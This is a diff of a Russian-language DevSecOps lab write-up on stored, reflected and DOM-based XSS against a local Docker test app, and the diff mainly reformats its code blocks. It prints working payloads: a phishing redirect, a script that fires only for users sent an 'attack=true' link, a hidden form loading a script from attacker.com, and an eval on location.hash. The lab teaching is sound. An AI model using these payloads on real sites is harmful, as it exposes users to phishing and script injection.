@@ -23,9 +23,7 @@
 
 ```bash
 docker pull ket9/otus-devsecops-xss:latest
-docker run -d -p 8080:80 --name otus-05 ket9/otus-devsecops-xss:latest```
-
- 
+docker run -d -p 8080:80 --name otus-05 ket9/otus-devsecops-xss:latest
 ```
 
 #### Stored XSS
@@ -34,17 +32,21 @@ docker run -d -p 8080:80 --name otus-05 ket9/otus-devsecops-xss:latest```
 
 В исследуемом сервисе такой вариант атаки доступен через добавление комментария. Например, можно организовать вывод сообщения при каждом открытии страницы со списком комментариев, указав в качестве текста комментария при его добавлении текст:
 
-`My first comment!<script>alert("Congratulations! You was hacked!")</script>`
+```javascript
+My first comment!<script>alert("Congratulations! You was hacked!")</script>
+```
 
 Можно привести сервис в состояние отказа в обслуживании в части просмотра или добавления комментариев, или выполнить редирект на фишинговый сайт с таким-же дизайном:
 
-`<script>window.location.href="https://google.com"</script>`
+```javascript
+<script>window.location.href="https://google.com"</script>
+```
 
 В этом случае при открытии страницы с комментариями автоматически будет происходить редирект на указанную ссылку.
 
 Могут быть случаи, когда подобного рода атака должна совершаться в отношении только одного или нескольких пользователей, а другие о ней знать не должны.  Доработав скрипт, мы получим его срабатывание только при наличии в адресной строке параметра **attack** со значением **true**:
 
-```
+```javascript
 <script> 
     const params = new URLSearchParams(window.location.search); 
     const attack= params.get("attack"); 
@@ -56,17 +58,21 @@ docker run -d -p 8080:80 --name otus-05 ket9/otus-devsecops-xss:latest```
 
 Нужным пользователям может быть отправлена должным образом сформированная ссылка фишинговым письмом, а остальные про наличие такой проблемы даже не узнают:
 
-`http://localhost:8080/XSS-1/index.php?attack=true`
+```
+http://localhost:8080/XSS-1/index.php?attack=true
+```
 
 #### Reflected XSS
 
 Вид атаки, когда результат достигается после ввода пользователем вредоносного кода. Другое название - неперсистентный XSS, так как вредоносный код не хранится на сервере. Вариант использования такой атаки - фишинговое письмо со ссылкой, содержащей вредоносный код:
 
-`get.php?search=<script>alert("XSS ATTACK!")></script>;`
+```
+get.php?search=<script>alert("XSS ATTACK!")></script>;
+```
 
 или через POST-запрос, например, в заранее подготовленной форме:
 
-```
+```javascript
 <form name=TheForm action=http://myapp.com/page.php method=post>
 	<input type=hidden name=foo value="<script src=http://attacker.com/bad.js></script>;"/>
 </form>
@@ -85,11 +91,15 @@ docker run -d -p 8080:80 --name otus-05 ket9/otus-devsecops-xss:latest```
 
 Добавляем комментарий:
 
-`<script>var l = location.hash.slice(1);eval(l);</script>`
+```javascript
+<script>var l = location.hash.slice(1);eval(l);</script>
+```
 
 Формируем ссылку:
 
-`http://localhost:8080/XSS-1/#alert('Surprise!')`
+```
+http://localhost:8080/XSS-1/#alert('Surprise!')
+```
 
 И получаем результат:
 
